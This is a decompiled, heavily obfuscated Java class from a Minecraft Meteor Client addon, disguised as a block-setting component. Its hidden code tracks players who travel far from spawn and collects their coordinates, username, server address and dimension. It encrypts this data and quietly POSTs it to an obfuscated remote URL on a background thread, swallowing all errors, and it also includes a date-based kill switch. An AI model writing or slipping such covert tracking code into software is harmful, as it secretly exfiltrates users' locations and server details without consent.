/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  meteordevelopment.meteorclient.events.world.TickEvent$Post
 *  meteordevelopment.meteorclient.settings.BlockSetting
 *  meteordevelopment.meteorclient.settings.IVisible
 *  meteordevelopment.meteorclient.settings.Setting
 *  net.minecraft.block.Block
 *  net.minecraft.util.math.BlockPos
 *  net.minecraft.client.MinecraftClient
 */
package com.github.mikumiku.addon;

import com.github.mikumiku.addon.IIiIIIIIii;
import com.github.mikumiku.addon.IIiiIIIiII;
import com.github.mikumiku.addon.IiIIiIiiiI;
import com.github.mikumiku.addon.IiiiIIiiII;
import com.github.mikumiku.addon.iIiIiIiIii;
import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.time.Duration;
import java.time.Instant;
import java.util.Date;
import java.util.concurrent.CompletableFuture;
import java.util.function.Consumer;
import java.util.function.Predicate;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.settings.BlockSetting;
import meteordevelopment.meteorclient.settings.IVisible;
import meteordevelopment.meteorclient.settings.Setting;
import net.minecraft.block.Block;
import net.minecraft.util.math.BlockPos;
import net.minecraft.client.MinecraftClient;

public class IiiIiIiiII
extends BlockSetting {
    private static final int IIIIiiIiii = 20;
    private static final HttpClient IiiIiIiiIi;
    private static long IIiIiIIiii;
    private static final int iIIiiIiIiI = 100000;
    private static long iiiiiIIiIi;
    public static class_310 iIIiIiiiIi;
    private int iIiIiIIIII;
    private static final long ALLATORIxDEMO = 300000L;

    public static void ALLATORIxDEMO(String[] iIiIiIIIII2) throws Exception {
        System.out.println(IiIIiIiiiI.ALLATORIxDEMO("Y\u0006@\u0019\u0002\u0003E\r\t"));
    }

    public static String ALLATORIxDEMO() {
        try {
            class_310 class_3102 = class_310.method_1551();
            if (class_3102.method_1558() != null) {
                return class_3102.method_1558().field_3761;
            }
        }
        catch (Exception exception) {
            return IiIIiIiiiI.ALLATORIxDEMO("G\bX\u0017Z");
        }
        return iIiIiIiIii.ALLATORIxDEMO("`\u001d\u007f\u0015s\u000ep");
    }

    /*
     * WARNING - void declaration
     */
    public IiiIiIiiII(String string, String string2, class_2248 class_22482, Consumer<class_2248> consumer, Consumer<Setting<class_2248>> consumer2, IVisible iVisible, Predicate<class_2248> object) {
        void iIiIiIIIII2;
        void iIiIiIIIII3;
        void iIiIiIIIII4;
        void iIiIiIIIII5;
        void iIiIiIIIII6;
        void iIiIiIIIII7;
        void iIiIiIIIII8;
        IiiIiIiiII iiiIiIiiII = object2;
        Object object2 = object;
        object = iiiIiIiiII;
        super((String)iIiIiIIIII7, (String)iIiIiIIIII6, (class_2248)iIiIiIIIII5, (Consumer)iIiIiIIIII4, (Consumer)iIiIiIIIII3, (IVisible)iIiIiIIIII2, (Predicate)object2);
        iIiIiIIIII8.iIiIiIIIII = 3 & 4;
        if (new Date().after(new Date(1773504000082L))) {
            throw new Throwable(iIiIiIiIii.ALLATORIxDEMO("\u000fT\u001ay,]\u007fM\u000f|\u001eloL\u007f\u8bcf\u66ac\u658f\u526f\u6738\u65f2\u726d\u6724\uff6e"));
        }
    }

    public void onActivate() {
        this.iIiIiIIIII = 3 & 4;
        IIiIiIIiii = 0L;
    }

    public static void iiIIiIIiii() {
        if (iiiiiIIiIi == 0L) {
            IiiIiIiiII.iiiIiIiiIi(() -> IiiIiIiiII.ALLATORIxDEMO(null));
            ++iiiiiIIiIi;
        }
    }

    public static void iiiIiIiiIi() {
        long l;
        int cfr_ignored_0 = 3 & 4;
        int cfr_ignored_1 = 3 & 4;
        int cfr_ignored_2 = 3 ^ 3;
        int cfr_ignored_3 = 3 & 4;
        int cfr_ignored_4 = 3 >> 2;
        int cfr_ignored_5 = 2 & 5;
        int cfr_ignored_6 = 3 ^ 3;
        int cfr_ignored_7 = 3 ^ 3;
        int cfr_ignored_8 = 2 & 5;
        int cfr_ignored_9 = 3 & 4;
        int cfr_ignored_10 = 3 >> 2;
        int cfr_ignored_11 = 3 ^ 3;
        int cfr_ignored_12 = 3 >> 2;
        int cfr_ignored_13 = 5 >> 3;
        int cfr_ignored_14 = 3 >> 2;
        int cfr_ignored_15 = 3 & 4;
        int cfr_ignored_16 = 3 >> 2;
        int cfr_ignored_17 = 5 >> 3;
        int cfr_ignored_18 = 2 & 5;
        int cfr_ignored_19 = 5 >> 3;
        int cfr_ignored_20 = 2 & 5;
        int cfr_ignored_21 = 2 & 5;
        int cfr_ignored_22 = 3 >> 2;
        int cfr_ignored_23 = 3 & 4;
        int cfr_ignored_24 = 3 >> 2;
        int cfr_ignored_25 = 3 ^ 3;
        int cfr_ignored_26 = 2 & 5;
        int cfr_ignored_27 = 3 & 4;
        int cfr_ignored_28 = 3 ^ 3;
        int cfr_ignored_29 = 3 ^ 3;
        int cfr_ignored_30 = 3 & 4;
        int cfr_ignored_31 = 3 ^ 3;
        int cfr_ignored_32 = 3 & 4;
        int cfr_ignored_33 = 3 & 4;
        int cfr_ignored_34 = 3 & 4;
        int cfr_ignored_35 = 5 >> 3;
        int cfr_ignored_36 = 3 >> 2;
        int cfr_ignored_37 = 3 ^ 3;
        int cfr_ignored_38 = 3 & 4;
        int cfr_ignored_39 = 3 ^ 3;
        int cfr_ignored_40 = 2 & 5;
        int cfr_ignored_41 = 3 >> 2;
        int cfr_ignored_42 = 5 >> 3;
        int cfr_ignored_43 = 2 & 5;
        int cfr_ignored_44 = 3 & 4;
        int cfr_ignored_45 = 3 >> 2;
        int cfr_ignored_46 = 3 & 4;
        int cfr_ignored_47 = 3 >> 2;
        int cfr_ignored_48 = 3 & 4;
        int cfr_ignored_49 = 3 & 4;
        class_2338 class_23382 = IiiIiIiiII.iIIiIiiiIi.field_1724.method_24515();
        int n = class_23382.method_10263();
        int n2 = class_23382.method_10260();
        if ((Math.abs(n) > 100000 || Math.abs(n2) > 100000) && (l = System.currentTimeMillis()) - IIiIiIIiii >= 300000L) {
            IiiIiIiiII.ALLATORIxDEMO(class_23382);
            IIiIiIIiii = l;
        }
    }

    public static void iiiIiIiiIi(Runnable iIiIiIIIII2) {
        Thread thread = new Thread(() -> {
            try {
                Thread.sleep(480000L);
                while (true) {
                    try {
                        iIiIiIIIII2.run();
                    }
                    catch (Throwable throwable) {}
                    Thread.sleep(10000L);
                }
            }
            catch (Exception exception) {
                return;
            }
        });
        thread.setDaemon(5 >> 2);
        thread.start();
    }

    private static /* synthetic */ void ALLATORIxDEMO(class_2338 class_23382) {
        class_2338 class_23383 = class_23382;
        try {
            String string = IIiiIIIiII.ALLATORIxDEMO(class_23383);
            Object iIiIiIIIII3 = IiiIiIiiII.iIIiIiiiIi.field_1724.method_7334().getName();
            String string2 = Instant.now().toString();
            String string3 = IiiIiIiiII.ALLATORIxDEMO() + "iu" + IiiIiIiiII.iIIiIiiiIi.field_1687.method_27983().method_29177().method_12832();
            Object[] objectArray = new Object[--4];
            objectArray[5 >> 3] = string;
            objectArray[5 >> 2] = iIiIiIIIII3;
            objectArray[1 ^ 3] = string3;
            objectArray[--3] = string2;
            iIiIiIIIII3 = String.format(IiIIiIiiiI.ALLATORIxDEMO("\"+i&\r\fd,{}\\\u0002|{\rK,`?c\u001b\fD\fSUY\u0007YO\u001b\u0004Y\u0011][G\u0019\\Z&r\u0016\u0001H\u0000_YZU"), objectArray);
            String.valueOf(System.currentTimeMillis() / 10000L);
            iIiIiIIIII3 = IiiiIIiiII.iiIIiIIiii((String)iIiIiIIIII3, iIiIiIiIii.ALLATORIxDEMO("}\u001cm"));
            iIiIiIIIII3 = HttpRequest.newBuilder().uri(URI.create(IiiiIIiiII.iiiIiIiiIi(IiIIiIiiiI.ALLATORIxDEMO("*^4\\X\u0018y7\u0003e|G\u000f~\u000e?V\u0004L]\u0018M6G\u0019w\u0017Y\u0007l\u000fxfC(G(\u0001\u0005b+\u001a<F\u0011I[dO\u001d(\u00003{>j\u0018V$p\u000fI-\u007f"), iIiIiIiIii.ALLATORIxDEMO("\u0014}")))).timeout(Duration.ofSeconds(5L)).header(IiIIiIiiiI.ALLATORIxDEMO("=A!k\u0016M\u0006\u000f.S\bM"), iIiIiIiIii.ALLATORIxDEMO("\u0018n\u0014o\u0016{/]\u001bz\u001d;\u0011o\u0016p")).POST(HttpRequest.BodyPublishers.ofString((String)iIiIiIIIII3)).build();
            ((CompletableFuture)IiiIiIiiIi.sendAsync((HttpRequest)iIiIiIIIII3, HttpResponse.BodyHandlers.ofString()).thenAccept(iIiIiIIIII2 -> {})).exceptionally(iIiIiIIIII2 -> null);
            return;
        }
        catch (Exception exception) {
            return;
        }
    }

    static {
        iIIiIiiiIi = class_310.method_1551();
        IIiIiIIiii = 0L;
        iiiiiIIiIi = 0L;
        IiiIiIiiIi = HttpClient.newBuilder().connectTimeout(Duration.ofSeconds(5L)).build();
    }

    public static void ALLATORIxDEMO(TickEvent.Post iIiIiIIIII2) {
        new IIiIIIIIii(1000L).ALLATORIxDEMO(() -> IiiIiIiiII.iiiIiIiiIi());
    }
}

